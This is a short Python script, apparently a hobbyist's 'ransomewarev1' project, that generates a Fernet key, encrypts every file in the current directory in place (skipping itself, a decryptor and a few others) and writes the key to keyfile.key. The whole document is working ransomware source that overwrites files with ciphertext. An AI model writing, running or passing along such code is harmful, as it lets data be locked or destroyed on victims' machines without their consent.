#! /Library/Frameworks/Python.framework/Versions/3.12/bin/python3


import os
from cryptography.fernet import Fernet

#get files

files = os.listdir()

# genereate key
key = Fernet.generate_key()
f = Fernet(key)
print(key)


if not os.path.isfile("keyfile.key"):
	for file in files: 
		if file == "ransomewarev1.py" or file == "get-pip.py" or file == "decryptor.py" or file == ".git":
			continue
		#encrypt
		rdata = open(file, "rb").read()
		edata = f.encrypt(rdata) 
		
		#write
		wdata = open(file, "wb")
		wdata.write(edata)
		wdata.close()	
		
	# save key to a new file
	keyf = open("keyfile.key", "wb")
	keyf.write(key)
	keyf.close()
	print("\n")
else:
	print("files are already encrypted")
	print("\n")
